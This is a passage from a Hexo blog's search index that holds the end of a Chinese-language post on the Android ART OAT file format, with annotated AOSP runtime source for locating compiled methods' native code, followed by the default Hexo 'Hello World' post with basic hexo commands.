class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const OatMethodOffsets* OatFile::OatClass::GetOatMethodOffsets(uint32_t method_index) const &#123;</span><br><span class="line">  // NOTE: We don&apos;t keep the number of methods and cannot do a bounds check for method_index.</span><br><span class="line">  if (methods_pointer_ == nullptr) &#123;//没有编译成native code</span><br><span class="line">    CHECK_EQ(kOatClassNoneCompiled, type_);</span><br><span class="line">    return nullptr;</span><br><span class="line">  &#125;</span><br><span class="line">  size_t methods_pointer_index;</span><br><span class="line">  if (bitmap_ == nullptr) &#123;//该类所有方法被编译成native code</span><br><span class="line">    CHECK_EQ(kOatClassAllCompiled, type_);</span><br><span class="line">    methods_pointer_index = method_index;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    CHECK_EQ(kOatClassSomeCompiled, type_);</span><br><span class="line">    if (!BitVector::IsBitSet(bitmap_, method_index)) &#123;//该方法没有对应的native code</span><br><span class="line">      return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line">    size_t num_set_bits = BitVector::NumSetBits(bitmap_, method_index);//使用bitmap记录哪些方法被编译成了native code</span><br><span class="line">    methods_pointer_index = num_set_bits;//找到相应的索引</span><br><span class="line">  &#125;</span><br><span class="line">  const OatMethodOffsets&amp; oat_method_offsets = methods_pointer_[methods_pointer_index];</span><br><span class="line">  return &amp;oat_method_offsets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//art/runtime/base/bit_vector.cc</span><br><span class="line">uint32_t BitVector::NumSetBits(const uint32_t* storage, uint32_t end) &#123;</span><br><span class="line">  uint32_t word_end = end &gt;&gt; 5; // end/32</span><br><span class="line">  uint32_t partial_word_bits = end &amp; 0x1f;// end%32</span><br><span class="line"></span><br><span class="line">  uint32_t count = 0u;// 为1的位的数目</span><br><span class="line">  for (uint32_t word = 0u; word &lt; word_end; word++) &#123;//先算前word_end个字中为1的位的数目，再算不满一个字的前partial_word_bits位中为1的位的数目</span><br><span class="line">    count += POPCOUNT(storage[word]);</span><br><span class="line">  &#125;</span><br><span class="line">  if (partial_word_bits != 0u) &#123;</span><br><span class="line">    count += POPCOUNT(storage[word_end] &amp; ~(0xffffffffu &lt;&lt; partial_word_bits));</span><br><span class="line">  &#125;</span><br><span class="line">  return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Bitmap的作用：</p><ul><li>Bitmaps are used to represent which methods are compiled.</li><li>Each bit represents every method in the class ,starting with direct methods,then virtual methods.</li><li>If bit it is set,the method is compiled.</li></ul><p>从OatClass中获取指定方法的native code时，返回的是OatMethod对象，源码如下：<br>/art/runtime/oat_file.cc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//method_index描述的是目标方法在类中的编号</span><br><span class="line">const OatFile::OatMethod OatFile::OatClass::GetOatMethod(uint32_t method_index) const &#123;</span><br><span class="line">  const OatMethodOffsets* oat_method_offsets = GetOatMethodOffsets(method_index);//获取方法偏移</span><br><span class="line">  if (oat_method_offsets == nullptr) &#123;</span><br><span class="line">    return OatMethod(nullptr, 0, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  if (oat_file_-&gt;IsExecutable() ||</span><br><span class="line">      Runtime::Current() == nullptr ||        // This case applies for oatdump.</span><br><span class="line">      Runtime::Current()-&gt;IsCompiler()) &#123;</span><br><span class="line">    return OatMethod(</span><br><span class="line">        oat_file_-&gt;Begin(),</span><br><span class="line">        oat_method_offsets-&gt;code_offset_,</span><br><span class="line">        oat_method_offsets-&gt;gc_map_offset_);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // We aren&apos;t allowed to use the compiled code. We just force it down the interpreted version.</span><br><span class="line">    return OatMethod(oat_file_-&gt;Begin(), 0, 0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/art/runtime/oat_file.h</span><br><span class="line">class OatMethod&#123;</span><br><span class="line">    public:</span><br><span class="line">    ...</span><br><span class="line">    OatMethod(</span><br><span class="line">        const byte* base,</span><br><span class="line">        const uint32_t code_offset,</span><br><span class="line">        const uint32_t gc_map_offset</span><br><span class="line">    );</span><br><span class="line">    OatMethod()&#123;&#125;</span><br><span class="line">    private:</span><br><span class="line">    ...</span><br><span class="line">    const byte* begin_; //oatdata段开始位置</span><br><span class="line">    uint32_t code_offset_;  //OatMethodOffsets-&gt;code_offset_</span><br><span class="line">    uint32_t native_gc_map_offset_;</span><br><span class="line">    friend class OatClass;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后就可以通过OatMethod来定位到方法的native code了（begin_+code_offset_）。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>Oat文件其实就是类型为shared object 的Elf文件，首先有一个Elf Header，Elf Header中e_phoff字段指向了program header talbe，e_shoff字段指向了section header table；</li><li>section header table中有一个名字为.dynsym的section head，该section head描述的section是符号表；</li><li>Oat文件导出了3个符号：oatdata，oatexec，oatlastword；</li><li>oatdata指向oatdata段，该区域存的是只读数据，包括 OatHeader，dex相关信息，dex类中方法与native code的映射关系（由 OatClass表示），通过OatClass可以找到对应方法的native code；</li><li>oatexec指向oatexec段，该区域存的是方法的native code，是可执行的；</li><li>oatlastword指向oatexec段的最后一个字的开始地址。即oatexec段的结束地址=oatlastword-&gt;st_value+3。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 文件格式相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/12/23/hello-world/"/>
      <url>/2018/12/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Hello World </category>
          
      </categories>
      
      
        <tags>
            
            <tag> welcome hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
